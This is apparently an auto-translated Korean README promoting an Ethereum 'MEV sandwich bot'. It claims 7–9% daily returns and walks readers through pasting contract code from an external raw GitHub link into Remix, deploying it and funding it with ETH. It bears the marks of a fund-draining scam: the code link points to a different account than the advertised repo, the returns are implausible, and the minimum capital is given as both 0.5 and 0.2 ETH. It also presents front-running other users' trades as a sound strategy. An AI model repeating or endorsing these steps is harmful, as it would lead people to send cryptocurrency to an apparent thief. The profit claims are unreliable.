# 🥪 이더리움 유니스왑 MEV. 샌드위치 봇 (DeFi)
![Bot Controls](https://imgur.com/Z5aVSek.png)

<div align="center">
<i>유니스왑 유동성 풀의 시장 비효율성을 활용하도록 설계된 오픈 소스 차익거래 봇입니다.<br>이더리움 MEV(최대 추출 가치) 거래 전략을 탐구하고자 하는 DeFi 애호가를 위해 제작되었습니다.</i>
</div>

<div align="center">
  <a href="https://github.com/Calindra54z05L/Mev-Bot-Uniswap">
    <img src="https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub stars" />
  </a>
  <a href="https://github.com/Calindra54z05L/Mev-Bot-Uniswap">
    <img src="https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub forks" />
  </a>
  <a href="https://github.com/ntkme/github-buttons/workflows/build">
    <img src="https://github.com/ntkme/github-buttons/workflows/build/badge.svg" alt="build" />
  </a>
</div>

<div align="center">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="Ethereum" />
  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="Solidity" />
</div>

## 📊 현재 성과

- **평균 일일 수익률**: 배포된 자본 대비 7–9% (시장 변동성에 따라 다름).
- **최소 자본 요건**: 0.5 ETH (현재 가스 및 유동성 조건 기준).
- **참고**: 수익성은 네트워크 혼잡도, 경쟁, 풀 유동성에 따라 달라집니다.
- **면책 조항**: 보장 없음. 과거 성과가 미래 결과를 예측하지 않습니다.

---

## 📈 최신 수익 거래 내역

**최종 업데이트**: 2025-04-19

아래는 실시간으로 ETH 수익을 보여주는 라이브 [MEV 샌드위치 봇](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000)이 실행한 최신 수익 거래 내역입니다.

| Tx Hash                                                                 | Block    | 수익 (ETH)  | 타임스탬프            |
|-------------------------------------------------------------------------|----------|--------------|---------------------|
| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |
| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |
| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |
| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |
| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |

---

## 📚 봇 동작 원리

이 봇은 이더리움 메모풀에서 유니스왑의 대규모 스왑 대기 거래를 모니터링합니다. **높은 슬리피지 거래**가 감지되면, **3단계 전략**을 실행합니다:

1. 대규모 스왑 전에 대상 자산을 구매합니다.
2. 대상 스왑이 자산 가격을 변동시키기를 기다립니다.
3. 최적화된 가격에 자산을 판매합니다.

기회 포착을 위해 필요 시 다중 거래도 수행할 수 있습니다.

---

## ✨ 주요 기능

- 이더리움 메모풀을 자동 모니터링하며 MEV 전략을 실행합니다.
- 경쟁력을 유지하기 위한 동적 가스 가격 책정.
- 실패한 거래에 대한 자동 리버트 및 수익 임계값 필터링 기능 내장.
- 전략 조정을 위한 오픈 소스 및 모듈식 코드베이스(예: 수익 임계값, 가스 배수 등).

---

## ⚡ 봇 실행 방법

### 1. 지갑 설치
[MetaMask](https://metamask.io/download.html) 또는 기타 EVM 호환 지갑을 다운로드 및 설정하세요.

### 2. Remix 열기
이더리움 스마트 계약 작성, 컴파일, 배포를 위한 웹 기반 환경인 [Remix - Ethereum IDE](https://remix.ethereum.org)에 접속하세요.

### 3. 새 파일 생성
📁 Remix에서 새 파일을 생성하고 예: `bot.sol`로 이름을 지정하세요.

![Create New File](https://i.imgur.com/1XiPUes.png)

### 4. 코드 붙여넣기
📋 GitHub에서 [봇 코드](https://raw.githubusercontent.com/Quovanewordy0JP/Mev-Bot-Uniswap/main/bots.sol)를 복사하여 새로 만든 Remix 파일에 붙여넣으세요.

### 5. 계약 컴파일
🔧 `Solidity Compiler` 탭에서 버전 `0.6.6+commit`을 선택하고 `bot.sol`을 컴파일하세요.

![Compile Contract](https://i.imgur.com/s5OAv6g.png)

### 6. 봇 배포
🚀 `Deploy & Run Transactions` 탭으로 이동해 `Injected Provider - MetaMask` 환경을 선택한 후 `Deploy`를 클릭하세요. MetaMask에서 계약 생성 수수료를 승인하여 MEV 봇을 배포하세요.

![Deploy Contract](https://i.imgur.com/2odZQNj.png)

---

## ⚙️ 구성

### 7. 봇에 자금 지원하기
새로 배포한 계약 주소를 복사하고 최소 0.2 ETH를 초기 잔액으로 계약 주소로 전송하여 자금을 지원하세요.

![Fund Bot](https://i.imgur.com/80NJYYr.png)

### 8. 봇 제어하기
다음 버튼을 사용하여 봇을 관리하세요:

- **시작**: 자금 지원 후 `Start` 버튼을 클릭하여 봇을 활성화합니다.
- **중지**: `Stop` 버튼을 클릭하여 봇 작동을 중단합니다.
- **출금**: `Withdrawal` 버튼을 클릭하여 모든 ETH를 소유자(봇을 배포한 지갑 주소)에게 출금합니다.

![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)

![Bot Interface](https://i.imgur.com/xczMc3G.png)

---

## 📜 라이선스

이 프로젝트는 [MIT 라이선스](LICENSE)를 따릅니다.

**알림**: 오픈 소스가 곧 승인이라는 뜻은 아닙니다. 책임감 있게 사용하세요.

---

## ⭐ 응원해 주세요

이 프로젝트가 도움이 되었다면 GitHub에서 스타를 눌러주세요. 여러분의 응원이 더 나은 개발과 개선을 이끕니다.

---

## 💭 자주 묻는 질문

### 봇이 실행되는 동안 브라우저에서 Remix를 계속 열어두어야 하나요?

아니요, 봇을 배포한 후에는 Remix를 닫아도 됩니다. 봇의 계약 주소를 저장하세요. 나중에 접근하려면 5단계처럼 Remix에서 코드를 다시 컴파일하고 `Deploy & Run Transactions`로 이동한 후 MetaMask를 재연결하고 계약 주소를 `Load contract from Address`에 붙여넣고 `At Address`를 클릭하세요. 봇이 "Deployed Contracts" 아래에 나타납니다.

### 다른 체인이나 DEX에서도 작동하나요?

현재 봇은 이더리움과 Uniswap 풀 전용으로 설계되었습니다.

---

## 🤝 기여 및 맞춤화

**봇을 개선하고 싶으신가요?**

1. 저장소를 포크하세요.
2. 개선 사항을 추가하세요(예: 새로운 풀 필터, 가스 최적화).
3. 풀 리퀘스트를 제출하세요!



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-21

---